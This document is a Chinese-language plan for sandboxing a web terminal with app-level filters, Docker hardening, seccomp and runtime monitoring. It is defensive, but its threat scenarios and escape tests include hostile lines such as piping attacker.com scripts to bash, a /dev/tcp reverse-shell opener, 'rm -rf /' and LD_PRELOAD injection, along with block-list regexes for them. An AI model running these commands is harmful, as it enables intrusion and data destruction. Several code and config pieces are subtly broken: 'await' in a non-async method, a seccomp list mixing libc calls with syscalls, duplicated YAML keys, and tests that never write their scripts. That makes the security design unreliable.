# Docker 终端隔离方案实施计划

## 📋 方案概述

基于当前项目现状（Windows 开发环境 + Docker 部署），设计一个**分层隔离架构**，兼顾安全性、跨平台兼容性和部署简便性。

---

## 🎯 核心设计原则

1. **开发环境兼容 Windows**：不依赖 Linux 专有特性（如 Bubblewrap）
2. **生产环境 Docker 优化**：充分利用容器隔离能力
3. **渐进式安全增强**：软件隔离 + 容器隔离 + 运行时监控
4. **零配置部署**：保持现有 Docker Compose 一键部署体验

---

## 🏗️ 架构设计

### 分层隔离架构

```
┌─────────────────────────────────────────┐
│     用户层（WebSocket 连接）             │
└─────────────────────────────────────────┘
                ↓
┌─────────────────────────────────────────┐
│   应用层隔离（软件验证）                 │
│   - PathSandbox（路径验证）              │
│   - SecureTerminal（命令过滤）           │
│   - 审计日志                             │
└─────────────────────────────────────────┘
                ↓
┌─────────────────────────────────────────┐
│   容器层隔离（Docker）                   │
│   - 用户命名空间（User Namespace）       │
│   - 能力限制（Capabilities Drop）        │
│   - 只读文件系统（Read-only Root）       │
│   - Seccomp 安全配置文件                 │
└─────────────────────────────────────────┘
                ↓
┌─────────────────────────────────────────┐
│   系统层隔离（宿主机内核）               │
│   - Cgroups 资源限制                     │
│   - SELinux/AppArmor（可选）             │
└─────────────────────────────────────────┘
```

---

## 📦 实施步骤

### 第一阶段：改进现有软件隔离（1-2 天）

#### 1.1 修复 PathSandbox 的路径处理逻辑

**问题**：当前实现阻止所有 `cd ..`，影响用户体验

**解决方案**：
- 跟踪用户的当前工作目录（虚拟 cwd）
- 允许 `cd ..`，但确保最终路径仍在 userRoot 内
- 规范化路径后检查是否在允许范围内

**修改文件**：
- `claude-code-haha/server/src/security/pathSandbox.ts`

**关键代码变更**：
```typescript
// 改进 cd 命令验证
private validateCdCommand(command: string): CommandValidationResult {
  const match = command.match(/^cd\s+(.+)$/)
  if (!match) {
    return { allowed: true } // cd 不带参数
  }

  const targetPath = match[1].trim()
  const unquotedPath = targetPath.replace(/^['"]|['"]$/g, '')

  // 解析目标路径（包含 .. 的规范化）
  const targetResult = this.resolvePath(unquotedPath)
  
  // 只要最终路径在 userRoot 内就允许
  if (!targetResult.allowed) {
    return {
      allowed: false,
      reason: targetResult.reason
    }
  }

  return { allowed: true }
}
```

#### 1.2 添加解释器调用检测

**问题**：可以通过 `python -c "import os; os.system('rm -rf /')"` 绕过命令过滤

**解决方案**：
- 检测常见解释器的危险调用模式
- 白名单 + 黑名单组合策略
- AST 级别的命令解析（可选高级功能）

**修改文件**：
- `claude-code-haha/server/src/security/pathSandbox.ts`

**新增检测规则**：
```typescript
const dangerousPatterns = [
  // Python 系统调用
  /python[3]?\s+(-c|-m)\s+["'].*os\.system\s*\(/i,
  /python[3]?\s+(-c|-m)\s+["'].*subprocess\./i,
  /python[3]?\s+(-c|-m)\s+["'].*__import__\s*\(/i,
  
  // Node.js 执行
  /node\s+(-e|-p)\s+["'].*exec\s*\(/i,
  /node\s+(-e|-p)\s+["'].*spawn\s*\(/i,
  /node\s+(-e|-p)\s+["'].*require\s*\(['"]child_process['"]\)/i,
  
  // Bash 嵌套执行
  /bash\s+(-c|--command)\s+["'].*sudo/i,
  /sh\s+-c\s+["'].*sudo/i,
  
  // Perl/Ruby 系统调用
  /perl\s+(-e)\s+["'].*system\s*\(/i,
  /ruby\s+(-e)\s+["'].*system\s*\(/i,
]
```

---

#### 1.3 脚本执行安全控制（新增❗）

**问题**：用户可以编写脚本文件然后执行，绕过命令检测

**攻击场景**：
```bash
# 场景 1：创建恶意脚本
echo "import os; os.system('rm -rf /')" > malicious.py
python malicious.py

# 场景 2：下载并执行远程脚本
curl https://attacker.com/malicious.sh | bash

# 场景 3：使用解释器执行脚本文件
python /workspaces/users/user123/script.py
node /workspaces/users/user123/script.js

# 场景 4：使用 shebang 直接执行
chmod +x script.sh
./script.sh
```

**解决方案**：多层脚本安全防护

**修改文件**：
- `claude-code-haha/server/src/security/pathSandbox.ts`
- `claude-code-haha/server/src/security/scriptValidator.ts` (新增)

**新增脚本验证模块**：

```typescript
// src/security/scriptValidator.ts

/**
 * 脚本验证器 - 检测和阻止恶意脚本
 */
export class ScriptValidator {
  private userId: string
  private userRoot: string
  
  constructor(userId: string, userRoot: string) {
    this.userId = userId
    this.userRoot = userRoot
  }
  
  /**
   * 验证脚本文件内容
   */
  async validateScriptContent(filePath: string): Promise<ValidationResult> {
    // 1. 检查文件是否在用户目录内
    const pathResult = this.validatePath(filePath)
    if (!pathResult.allowed) {
      return pathResult
    }
    
    // 2. 读取脚本内容
    const content = await readFile(filePath, 'utf-8')
    
    // 3. 检测危险模式
    const dangerousPatterns = [
      // 系统调用
      /\bos\.system\s*\(/i,
      /\bsubprocess\./i,
      /\bexec\s*\(/i,
      /\beval\s*\(/i,
      /\brequire\s*\(['"]child_process['"]\)/i,
      /\bshell_exec\s*\(/i,
      /\bsystem\s*\(/i,
      /\bpassthru\s*\(/i,
      
      // 网络攻击
      /\bsocket\./i,
      /\brequests\.post\s*\(/i,
      /\bfetch\s*\(/i,
      /\/dev\/tcp\//i,
      
      // 文件操作
      /\bopen\s*\(\s*['"]\/etc\//i,
      /\bopen\s*\(\s*['"]\/proc\//i,
      /\bshutil\.rmtree\s*\(/i,
      
      // 权限提升
      /\bsudo\s+/i,
      /\bsu\s+/i,
      /\bsetuid\s*\(/i,
      /\bsetgid\s*\(/i,
    ]
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(content)) {
        return {
          allowed: false,
          reason: `❌ 安全限制：脚本包含危险代码（${pattern.source}）`,
          severity: 'high'
        }
      }
    }
    
    // 4. 检查脚本大小（防止巨型脚本消耗资源）
    const stats = await stat(filePath)
    if (stats.size > 1024 * 1024) { // 1MB 限制
      return {
        allowed: false,
        reason: '❌ 安全限制：脚本文件大小超过 1MB 限制',
        severity: 'medium'
      }
    }
    
    return { allowed: true }
  }
  
  /**
   * 验证脚本执行命令
   */
  validateScriptExecution(command: string): ValidationResult {
    // 提取脚本路径
    const scriptPath = this.extractScriptPath(command)
    
    if (!scriptPath) {
      return { allowed: true } // 不是脚本执行命令
    }
    
    // 验证路径
    const pathResult = this.validatePath(scriptPath)
    if (!pathResult.allowed) {
      return pathResult
    }
    
    // 检查是否尝试执行用户目录外的脚本
    if (!scriptPath.startsWith(this.userRoot)) {
      return {
        allowed: false,
        reason: '❌ 安全限制：只能执行工作目录内的脚本',
        severity: 'high'
      }
    }
    
    // 检查常见的脚本执行模式
    const scriptPatterns = [
      /^(python|python3|node|bash|sh|perl|ruby)\s+([^&|;]+)/i,
      /^\.\/([^&|;]+)/i,
    ]
    
    for (const pattern of scriptPatterns) {
      const match = command.match(pattern)
      if (match) {
        const scriptPath = match[2]?.trim()
        if (scriptPath && !scriptPath.startsWith(this.userRoot)) {
          return {
            allowed: false,
            reason: '❌ 安全限制：禁止执行工作目录外的脚本',
            severity: 'high'
          }
        }
      }
    }
    
    return { allowed: true }
  }
  
  /**
   * 检测并阻止远程脚本下载执行
   */
  detectRemoteScriptExecution(command: string): ValidationResult {
    const dangerousPatterns = [
      // curl | bash
      /curl\s+[^|]+\|\s*(bash|sh|zsh)/i,
      // wget | bash
      /wget\s+[^|]+\|\s*(bash|sh|zsh)/i,
      // curl -sSfL | bash
      /curl\s+(-[^\s]+\s+)*\|\s*(bash|sh)/i,
      // wget -qO- | bash
      /wget\s+(-[^\s]+\s+)*\|\s*(bash|sh)/i,
      // bash <(curl ...)
      /bash\s+<\(\s*curl\s+/i,
      // source <(curl ...)
      /source\s+<\(\s*curl\s+/i,
      // . <(curl ...)
      /^\.\s+<\(\s*curl\s+/i,
    ]
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(command)) {
        return {
          allowed: false,
          reason: '❌ 安全限制：禁止下载并执行远程脚本（可能存在安全风险）',
          suggestion: '请先下载脚本到本地，审查后再执行',
          severity: 'critical'
        }
      }
    }
    
    return { allowed: true }
  }
}
```

**集成到 PathSandbox**：

```typescript
// src/security/pathSandbox.ts

export class PathSandbox {
  private scriptValidator: ScriptValidator
  
  constructor(config: PathSandboxConfig) {
    // ... 现有代码 ...
    
    // 初始化脚本验证器
    this.scriptValidator = new ScriptValidator(config.userId, config.userRoot)
  }
  
  validateCommand(command: string): CommandValidationResult {
    // ... 现有检查 ...
    
    // 1. 检测远程脚本下载执行
    const remoteScriptResult = this.scriptValidator.detectRemoteScriptExecution(command)
    if (!remoteScriptResult.allowed) {
      return remoteScriptResult
    }
    
    // 2. 检测脚本文件执行
    const scriptExecResult = this.scriptValidator.validateScriptExecution(command)
    if (!scriptExecResult.allowed) {
      return scriptExecResult
    }
    
    // 3. 对于脚本执行命令，需要验证脚本内容
    if (this.isScriptExecution(command)) {
      const scriptPath = this.extractScriptPath(command)
      if (scriptPath) {
        // 异步验证脚本内容（在允许执行之前）
        const contentResult = await this.scriptValidator.validateScriptContent(scriptPath)
        if (!contentResult.allowed) {
          return contentResult
        }
      }
    }
    
    return { allowed: true }
  }
  
  private isScriptExecution(command: string): boolean {
    const scriptPatterns = [
      /^(python|python3|node|bash|sh|perl|ruby)\s+['"]?([^'"\s]+\.)(py|js|sh|pl|rb)/i,
      /^\.\/([^'"\s]+\.)(py|js|sh|pl|rb)/i,
    ]
    
    for (const pattern of scriptPatterns) {
      if (pattern.test(command)) {
        return true
      }
    }
    
    return false
  }
}
```

**脚本白名单机制**：

```typescript
// 允许的安全脚本类型
const SAFE_SCRIPT_PATTERNS = [
  // 构建脚本
  /^(npm|yarn|pnpm)\s+(run|build|test)/i,
  /^make\s+/i,
  /^cmake\s+/i,
  
  // 开发工具
  /^tsc\s+/i,
  /^eslint\s+/i,
  /^prettier\s+/i,
  
  // Git 操作
  /^git\s+/i,
  
  // 包管理
  /^pip\s+(install|list|show)/i,
  /^npm\s+(install|list)/i,
]

function isSafeScript(command: string): boolean {
  return SAFE_SCRIPT_PATTERNS.some(pattern => pattern.test(command))
}
```

#### 1.4 增强审计日志功能

**目标**：记录所有可疑行为，支持事后分析和告警

**修改文件**：
- `claude-code-haha/server/src/security/secureTerminal.ts`
- `claude-code-haha/server/src/integration/ptyManager.ts`

**新增审计事件类型**：
- `escape_attempt`：检测到逃逸尝试
- `interpreter_abuse`：解释器滥用
- `script_blocked`：脚本执行被阻止
- `remote_script_blocked`：远程脚本下载被阻止
- `resource_limit_exceeded`：资源超限

**审计日志输出**：
```typescript
interface AuditEvent {
  type: AuditEventType
  userId: string
  sessionId: string
  timestamp: Date
  command?: string
  reason?: string
  severity?: 'low' | 'medium' | 'high' | 'critical'
  data?: Record<string, any>
}
```

**脚本执行审计**：
```typescript
// 记录所有脚本执行尝试
this.audit('script_execution', {
  scriptPath: '/workspaces/users/user123/build.sh',
  interpreter: 'bash',
  fileSize: 1024,
  executionTime: 1234
})

// 记录被阻止的脚本
this.audit('script_blocked', {
  scriptPath: '/workspaces/users/user123/malicious.py',
  reason: '包含危险代码：os.system()',
  severity: 'high'
})
```

---

### 第二阶段：Docker 容器安全加固（1-2 天）

#### 2.1 脚本执行的文件系统限制

**问题**：即使命令层有验证，用户仍然可以：
- 创建可执行脚本
- 修改现有脚本
- 通过 shebang 直接执行

**解决方案**：Docker 层文件系统限制

**修改文件**：
- `claude-code-haha/docker-compose.yml`

**新增配置**：

```yaml
backend:
  # 使用临时文件系统限制脚本写入
  tmpfs:
    - /tmp:noexec,nosuid,size=100m  # noexec: 禁止执行
    - /var/tmp:noexec,nosuid,size=50m
  
  # 挂载用户目录为 noexec（可选，激进方案）
  volumes:
    - user_workspaces:/app/workspaces/users:rw,noexec  # 禁止执行用户目录中的二进制文件
  
  # 只读根文件系统
  read_only: true
  
  # 允许创建的临时目录
  tmpfs:
    - /tmp:noexec,nosuid,size=100m,mode=1777
    - /var/tmp:noexec,nosuid,size=50m,mode=1777
```

**注意**：`noexec` 挂载选项会阻止直接执行脚本，但仍然可以通过解释器执行：
```bash
# 被阻止
./script.sh

# 仍然可行
bash script.sh
python script.py
```

因此需要配合应用层的脚本验证。

---

#### 2.2 优化 Dockerfile 安全配置

**修改文件**：
- `claude-code-haha/server/Dockerfile`

**改进措施**：

```dockerfile
# 1. 使用非 root 用户（已有，保持）
USER bun

# 2. 移除不必要的系统工具
RUN apt-get remove -y \
    sudo \
    ssh \
    mount \
    fdisk \
    && apt-get autoremove -y

# 3. 限制 PATH
ENV PATH=/usr/local/bin:/usr/bin:/bin

# 4. 设置安全的工作目录
WORKDIR /app

# 5. 禁用不必要的功能
ENV HISTFILE=/dev/null
ENV HISTSIZE=0
```

#### 2.2 增强 Docker Compose 安全配置

**修改文件**：
- `claude-code-haha/docker-compose.yml`

**当前配置分析**：
```yaml
backend:
  privileged: true  # ⚠️ 过于宽松，需要优化
```

**改进方案**：

```yaml
backend:
  # ❌ 移除 privileged: true（过于宽松）
  
  # ✅ 使用细粒度的能力控制
  cap_drop:
    - ALL
  cap_add:
    - CHOWN        # 允许修改文件所有者（PTY 需要）
    - SETUID       # 允许设置用户 ID（PTY 需要）
    - SETGID       # 允许设置组 ID（PTY 需要）
    - MKNOD        # 允许创建设备节点（PTY 需要）
    - AUDIT_WRITE  # 允许写入审计日志（可选）
  
  # ✅ 启用安全优化配置
  security_opt:
    - no-new-privileges:true  # 禁止提权
    - apparmor:unconfined     # 禁用 AppArmor（避免干扰 PTY）
  
  # ✅ 只读根文件系统（关键！）
  read_only: true
  
  # ✅ 临时文件系统（允许创建临时文件）
  tmpfs:
    - /tmp:noexec,nosuid,size=100m
    - /var/tmp:noexec,nosuid,size=50m
  
  # ✅ 用户命名空间隔离（可选，需要 Docker 配置）
  user: "1000:1000"  # 以非 root 用户运行
  
  # ✅ 禁用网络（如果不需要）
  # network_mode: "none"
  
  # ✅ 资源限制
  deploy:
    resources:
      limits:
        memory: 512M
        cpus: '1.0'
        pids: 100  # 限制进程数
```

#### 2.3 创建 Seccomp 安全配置文件

**新增文件**：
- `claude-code-haha/docker/seccomp-profile.json`

**Seccomp 配置**：
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "archMap": [
    {
      "architecture": "SCMP_ARCH_X86_64",
      "subArchitectures": ["SCMP_ARCH_X86", "SCMP_ARCH_X32"]
    }
  ],
  "syscalls": [
    {
      "names": [
        "accept", "access", "alarm", "bind", "brk", "capget",
        "capset", "chdir", "chmod", "chown", "clock_getres",
        "clock_gettime", "close", "connect", "dup", "dup2",
        "execve", "exit", "exit_group", "fcntl", "fstat",
        "futex", "getcwd", "getegid", "geteuid", "getgid",
        "getpeername", "getpid", "getppid", "getsockname",
        "getsockopt", "gettid", "gettimeofday", "getuid",
        "ioctl", "kill", "listen", "lseek", "lstat", "madvise",
        "mkdir", "mmap", "mprotect", "mremap", "munmap",
        "nanosleep", "open", "openat", "pipe", "poll",
        "prctl", "pread64", "preadv", "prlimit64", "pwrite64",
        "read", "readlink", "readv", "recv", "recvfrom",
        "recvmsg", "rename", "rmdir", "rt_sigaction",
        "rt_sigpending", "rt_sigprocmask", "rt_sigqueueinfo",
        "rt_sigreturn", "rt_sigsuspend", "rt_sigtimedwait",
        "sched_getaffinity", "sched_getscheduler", "sched_yield",
        "select", "send", "sendmsg", "sendto", "set_robust_list",
        "set_tid_address", "setfsgid", "setfsuid", "setgid",
        "setgroups", "setpgid", "setsid", "setsockopt",
        "setuid", "shutdown", "sigaltstack", "socket",
        "socketpair", "stat", "statfs", "symlink", "sync",
        "sysinfo", "tgkill", "time", "times", "umask",
        "uname", "unlink", "unlinkat", "utimes", "wait4",
        "waitid", "write", "writev",
        
        // PTY 相关系统调用（必需）
        "ptsname", "unlockpt", "grantpt",
        "tcgetattr", "tcsetattr", "tcflush", "tcdrain",
        "tcflow", "tcsendbreak", "cfmakeraw", "cfgetospeed",
        "cfgetispeed", "cfsetospeed", "cfsetispeed",
        "ttyname", "ttyname_r", "isatty"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**在 docker-compose.yml 中使用**：
```yaml
backend:
  security_opt:
    - seccomp:./docker/seccomp-profile.json
```

---

### 第三阶段：用户级容器隔离（可选，2-3 天）

> **适用场景**：高安全性需求的多租户环境

#### 3.1 动态用户容器架构

**设计思路**：
- 为每个用户创建一个轻量级容器
- 通过 Docker API 动态管理容器生命周期
- WebSocket 连接路由到对应用户容器

**架构变更**：
```
┌─────────────────────────────────────┐
│      WebSocket Gateway              │
│  - 用户认证                          │
│  - 连接路由                          │
└─────────────────────────────────────┘
                ↓
┌─────────────────────────────────────┐
│   User Container Manager            │
│  - 动态创建用户容器                  │
│  - 容器生命周期管理                  │
│  - 资源配额控制                      │
└─────────────────────────────────────┘
                ↓
┌─────────────────────────────────────┐
│   User Container (per user)         │
│  - 独立的用户工作目录                │
│  - 独立的 PTY 会话                   │
│  - 独立的资源限制                    │
└─────────────────────────────────────┘
```

#### 3.2 实现用户容器管理器

**新增文件**：
- `claude-code-haha/server/src/isolation/userContainerManager.ts`

**核心功能**：
```typescript
interface UserContainerConfig {
  userId: string
  userRoot: string
  memoryLimit: string
  cpuLimit: number
  ptyLimit: number
}

class UserContainerManager {
  // 创建或获取用户容器
  async getOrCreateContainer(
    userId: string,
    config: UserContainerConfig
  ): Promise<ContainerInfo>
  
  // 销毁用户容器
  async destroyContainer(userId: string): Promise<void>
  
  // 在用户容器中执行命令
  async execInContainer(
    userId: string,
    command: string,
    options: ExecOptions
  ): Promise<ExecResult>
  
  // 创建容器内 PTY 会话
  async createContainerPTY(
    userId: string,
    options: PTYOptions
  ): Promise<PTYSession>
}
```

#### 3.3 修改 PTY Manager 支持容器路由

**修改文件**：
- `claude-code-haha/server/src/integration/ptyManager.ts`

**新增容器模式**：
```typescript
export interface PTYCreateOptions {
  // ... 现有字段 ...
  
  // 容器隔离选项
  isolationMode?: 'software' | 'container' | 'hybrid'
  containerId?: string  // 目标容器 ID
}

export class PTYSessionManager {
  private containerManager: UserContainerManager
  
  async createSession(options: PTYCreateOptions): Promise<PTYSession> {
    if (options.isolationMode === 'container' && options.containerId) {
      return this.createContainerPTY(options)
    } else {
      return this.createSoftwareIsolatedPTY(options)
    }
  }
}
```

---

### 第四阶段：运行时监控和告警（1-2 天）

#### 4.1 脚本执行运行时监控（新增❗）

**问题**：静态分析无法检测所有恶意脚本，需要运行时监控

**解决方案**：多层次的运行时监控

**新增文件**：
- `claude-code-haha/server/src/monitoring/scriptRuntimeMonitor.ts`

**实现方案**：

```typescript
// src/monitoring/scriptRuntimeMonitor.ts

/**
 * 脚本运行时监控器
 * 
 * 监控脚本执行过程中的行为，检测异常模式
 */
export class ScriptRuntimeMonitor {
  private activeScripts: Map<string, ScriptInfo> = new Map()
  private scriptLimits: ScriptLimits = {
    maxChildProcesses: 5,      // 最大子进程数
    maxFileDescriptors: 100,   // 最大文件描述符数
    maxMemoryMB: 256,          // 最大内存使用
    maxExecutionTimeMs: 60000, // 最大执行时间（60 秒）
    maxFileSize: 50 * 1024 * 1024, // 最大文件写入（50MB）
  }
  
  /**
   * 开始监控脚本执行
   */
  async startMonitoring(
    scriptPath: string,
    process: ChildProcess
  ): Promise<MonitoringSession> {
    const sessionId = uuidv4()
    
    const session: MonitoringSession = {
      id: sessionId,
      scriptPath,
      process,
      startTime: Date.now(),
      childProcesses: new Set(),
      fileWrites: [],
      networkConnections: [],
    }
    
    // 监控子进程创建
    this.monitorChildProcesses(session)
    
    // 监控文件操作
    this.monitorFileOperations(session)
    
    // 监控网络活动
    this.monitorNetworkActivity(session)
    
    // 设置超时
    this.setupTimeout(session)
    
    this.activeScripts.set(sessionId, session)
    
    return session
  }
  
  /**
   * 监控子进程创建
   */
  private monitorChildProcesses(session: MonitoringSession): void {
    // 使用 ps-tree 或类似工具监控进程树
    const checkInterval = setInterval(() => {
      const childProcesses = getChildProcesses(session.process.pid)
      
      if (childProcesses.length > this.scriptLimits.maxChildProcesses) {
        this.triggerAlert(session, {
          type: 'too_many_child_processes',
          message: `脚本创建了 ${childProcesses.length} 个子进程，超过限制 ${this.scriptLimits.maxChildProcesses}`,
          severity: 'high',
          action: 'terminate'
        })
      }
      
      session.childProcesses = new Set(childProcesses.map(p => p.PID))
    }, 1000)
    
    session.process.on('exit', () => {
      clearInterval(checkInterval)
    })
  }
  
  /**
   * 监控文件操作
   */
  private monitorFileOperations(session: MonitoringSession): void {
    // 使用 fs.watch 或 inotify 监控文件访问
    const userRoot = getUserRootFromScript(session.scriptPath)
    
    const watcher = watch(userRoot, {
      recursive: true,
      persistent: false
    }, (eventType, filename) => {
      // 记录文件操作
      session.fileWrites.push({
        path: filename,
        type: eventType,
        timestamp: Date.now()
      })
      
      // 检测大量文件删除
      const recentDeletes = session.fileWrites.filter(w => 
        w.type === 'rename' && // rm 操作会触发 rename
        Date.now() - w.timestamp < 5000 // 5 秒内
      )
      
      if (recentDeletes.length > 10) {
        this.triggerAlert(session, {
          type: 'mass_file_deletion',
          message: `检测到大量文件删除（5 秒内 ${recentDeletes.length} 个文件）`,
          severity: 'critical',
          action: 'terminate'
        })
      }
    })
    
    session.process.on('exit', () => {
      watcher.close()
    })
  }
  
  /**
   * 监控网络活动
   */
  private monitorNetworkActivity(session: MonitoringSession): void {
    // 使用 netstat 或 ss 监控网络连接
    const checkInterval = setInterval(() => {
      const connections = getNetworkConnections(session.process.pid)
      
      // 检测异常连接
      const suspiciousConnections = connections.filter(conn => {
        // 检测反向 shell 特征
        if (conn.state === 'ESTABLISHED' && conn.remotePort < 1024) {
          return true
        }
        
        // 检测非常用端口
        if (![80, 443, 22, 3306].includes(conn.remotePort)) {
          return true
        }
        
        return false
      })
      
      if (suspiciousConnections.length > 0) {
        this.triggerAlert(session, {
          type: 'suspicious_network_activity',
          message: `检测到可疑网络连接：${suspiciousConnections.map(c => c.remoteAddress).join(', ')}`,
          severity: 'critical',
          action: 'terminate'
        })
      }
      
      session.networkConnections = suspiciousConnections
    }, 2000)
    
    session.process.on('exit', () => {
      clearInterval(checkInterval)
    })
  }
  
  /**
   * 设置执行超时
   */
  private setupTimeout(session: MonitoringSession): void {
    const timeout = setTimeout(() => {
      this.triggerAlert(session, {
        type: 'execution_timeout',
        message: `脚本执行超过 ${this.scriptLimits.maxExecutionTimeMs}ms`,
        severity: 'medium',
        action: 'terminate'
      })
    }, this.scriptLimits.maxExecutionTimeMs)
    
    session.process.on('exit', () => {
      clearTimeout(timeout)
    })
  }
  
  /**
   * 触发告警
   */
  private triggerAlert(
    session: MonitoringSession,
    alert: ScriptAlert
  ): void {
    // 记录告警
    console.warn(`[ScriptRuntimeMonitor] ${alert.type}: ${alert.message}`)
    
    // 发送告警事件
    emit('script_alert', {
      sessionId: session.id,
      scriptPath: session.scriptPath,
      ...alert
    })
    
    // 自动响应
    if (alert.action === 'terminate') {
      console.log(`[ScriptRuntimeMonitor] Terminating script: ${session.scriptPath}`)
      
      // 终止主进程
      session.process.kill()
      
      // 终止所有子进程
      session.childProcesses.forEach(pid => {
        try {
          process.kill(pid)
        } catch (e) {
          // 进程可能已经退出
        }
      })
    }
  }
}
```

**集成到 PTY Manager**：

```typescript
// src/integration/ptyManager.ts

import { ScriptRuntimeMonitor } from '../monitoring/scriptRuntimeMonitor'

export class PTYSessionManager {
  private scriptMonitor: ScriptRuntimeMonitor
  
  constructor() {
    this.scriptMonitor = new ScriptRuntimeMonitor()
  }
  
  async write(sessionId: string, data: string): Promise<boolean> {
    const session = this.sessions.get(sessionId)
    if (!session) return false
    
    // 检测是否是脚本执行命令
    if (this.isScriptExecutionCommand(data)) {
      const scriptPath = this.extractScriptPath(data)
      
      // 启动运行时监控
      const monitoringSession = await this.scriptMonitor.startMonitoring(
        scriptPath,
        session.process
      )
      
      // 记录监控会话
      session.scriptMonitoringSession = monitoringSession
    }
    
    return super.write(sessionId, data)
  }
}
```

---

#### 4.2 实现资源监控器

**新增文件**：
- `claude-code-haha/server/src/monitoring/resourceMonitor.ts`

**监控指标**：
```typescript
interface ResourceMetrics {
  // CPU 使用
  cpuUsage: {
    percent: number
    userTime: number
    systemTime: number
  }
  
  // 内存使用
  memoryUsage: {
    rss: number
    heapUsed: number
    heapTotal: number
    external: number
  }
  
  // 进程数
  processCount: number
  
  // 文件描述符
  fileDescriptorCount: number
  
  // PTY 会话数
  ptySessionCount: number
}

class ResourceMonitor {
  // 启动监控
  startMonitoring(intervalMs?: number): void
  
  // 获取当前指标
  getMetrics(): ResourceMetrics
  
  // 检查是否超限
  checkLimits(): LimitViolation[]
  
  // 注册告警回调
  onLimitViolation(callback: (violation: LimitViolation) => void): void
}
```

#### 4.2 实现异常行为检测

**新增文件**：
- `claude-code-haha/server/src/security/anomalyDetector.ts`

**检测规则**：
```typescript
class AnomalyDetector {
  // 检测快速连续的命令执行（可能是脚本攻击）
  detectRapidCommandExecution(
    userId: string,
    timeWindowMs: number,
    threshold: number
  ): boolean
  
  // 检测大量文件访问（可能是数据窃取）
  detectMassFileAccess(
    userId: string,
    timeWindowMs: number,
    threshold: number
  ): boolean
  
  // 检测异常的资源使用
  detectResourceAbuse(
    userId: string,
    metrics: ResourceMetrics
  ): boolean
  
  // 检测逃逸尝试模式
  detectEscapePattern(
    userId: string,
    commands: string[]
  ): boolean
}
```

#### 4.3 集成告警系统

**修改文件**：
- `claude-code-haha/server/src/integration/ptyManager.ts`
- `claude-code-haha/server/src/security/secureTerminal.ts`

**告警级别**：
```typescript
type AlertLevel = 'info' | 'warning' | 'error' | 'critical'

interface SecurityAlert {
  level: AlertLevel
  type: string
  userId: string
  sessionId: string
  timestamp: Date
  message: string
  details?: Record<string, any>
  action?: 'log' | 'notify' | 'block' | 'terminate'
}
```

**告警处理**：
```typescript
class SecurityAlertManager {
  // 发送告警
  async sendAlert(alert: SecurityAlert): Promise<void>
  
  // 记录到审计日志
  logAlert(alert: SecurityAlert): void
  
  // 通知管理员（邮件、Webhook 等）
  notifyAdmin(alert: SecurityAlert): void
  
  // 自动响应（阻断、终止会话等）
  autoRespond(alert: SecurityAlert): void
}
```

---

### 第五阶段：测试和验证（1-2 天）

#### 5.1 编写单元测试

**修改文件**：
- `claude-code-haha/server/src/__tests__/security/terminalIsolation.test.ts`

**新增测试用例**：
```typescript
describe('改进的路径处理', () => {
  test('应该允许 cd .. 只要最终路径在 userRoot 内', () => {
    const result = sandbox.validateCommand('cd ..')
    expect(result.allowed).toBe(true)
  })
  
  test('应该阻止 cd 到 userRoot 外', () => {
    const result = sandbox.validateCommand('cd /etc')
    expect(result.allowed).toBe(false)
  })
})

describe('解释器调用检测', () => {
  test('应该阻止 python os.system 调用', () => {
    const result = sandbox.validateCommand(
      `python -c "import os; os.system('ls /')"`
    )
    expect(result.allowed).toBe(false)
  })
  
  test('应该阻止 node child_process 调用', () => {
    const result = sandbox.validateCommand(
      `node -e "require('child_process').exec('ls /')"`
    )
    expect(result.allowed).toBe(false)
  })
})
```

#### 5.2 Docker 安全配置测试

**新增测试脚本**：
- `claude-code-haha/tests/docker-security-test.sh`

**测试内容**：
```bash
#!/bin/bash

# 测试 1：验证容器以非 root 用户运行
echo "测试 1：检查用户身份..."
docker exec claude-backend whoami
# 应该输出：bun（不是 root）

# 测试 2：验证无法提权
echo "测试 2：测试提权..."
docker exec claude-backend sudo whoami
# 应该失败：command not found

# 测试 3：验证只读文件系统
echo "测试 3：测试文件系统..."
docker exec claude-backend touch /test-file
# 应该失败：Read-only file system

# 测试 4：验证资源限制
echo "测试 4：测试资源限制..."
docker exec claude-backend cat /sys/fs/cgroup/memory/memory.limit_in_bytes
# 应该输出：536870912 (512MB)

# 测试 5：验证 Seccomp 配置
echo "测试 5：测试系统调用限制..."
docker exec claude-backend strace ls
# 应该失败：strace 命令不存在或被阻止
```

#### 5.3 逃逸尝试测试

**创建测试用例**：
- `claude-code-haha/tests/escape-attempts-test.ts`

**测试场景**：
```typescript
const escapeAttempts = [
  // 路径遍历
  'cd ../../etc',
  'cat /etc/passwd',
  'ls /root',
  
  // 符号链接逃逸
  'ln -s /etc /tmp/etc-link',
  'cd /tmp/etc-link',
  
  // 解释器绕过
  'python3 -c "import os; os.chdir(\'/etc\')"',
  'node -e "process.chdir(\'/etc\')"',
  
  // 环境变量注入
  'export HOME=/root',
  'LD_PRELOAD=/tmp/malicious.so ls',
  
  // 进程注入
  'bash -c "exec 3<>/dev/tcp/attacker.com/4444"',
]

for (const attempt of escapeAttempts) {
  test(`应该阻止逃逸尝试：${attempt}`, () => {
    const result = sandbox.validateCommand(attempt)
    expect(result.allowed).toBe(false)
  })
}
```

---

#### 5.4 脚本安全专项测试（新增❗）

**创建测试用例**：
- `claude-code-haha/tests/script-security-test.ts`

**测试场景**：

```typescript
describe('脚本执行安全', () => {
  let sandbox: PathSandbox
  let scriptValidator: ScriptValidator
  
  beforeEach(() => {
    sandbox = createPathSandbox('test-user', '/workspaces/users/test-user')
    scriptValidator = new ScriptValidator('test-user', '/workspaces/users/test-user')
  })
  
  describe('脚本内容验证', () => {
    test('应该阻止包含 os.system 的 Python 脚本', async () => {
      const scriptContent = `
import os
os.system('rm -rf /')
      `.trim()
      
      const result = await scriptValidator.validateScriptContent('/tmp/test.py')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('os.system')
    })
    
    test('应该阻止包含 subprocess 的 Python 脚本', async () => {
      const scriptContent = `
import subprocess
subprocess.call(['rm', '-rf', '/'])
      `.trim()
      
      const result = await scriptValidator.validateScriptContent('/tmp/test.py')
      expect(result.allowed).toBe(false)
    })
    
    test('应该阻止包含 child_process 的 Node.js 脚本', async () => {
      const scriptContent = `
const { exec } = require('child_process')
exec('rm -rf /')
      `.trim()
      
      const result = await scriptValidator.validateScriptContent('/tmp/test.js')
      expect(result.allowed).toBe(false)
    })
    
    test('应该阻止包含 eval 的脚本', async () => {
      const scriptContent = `
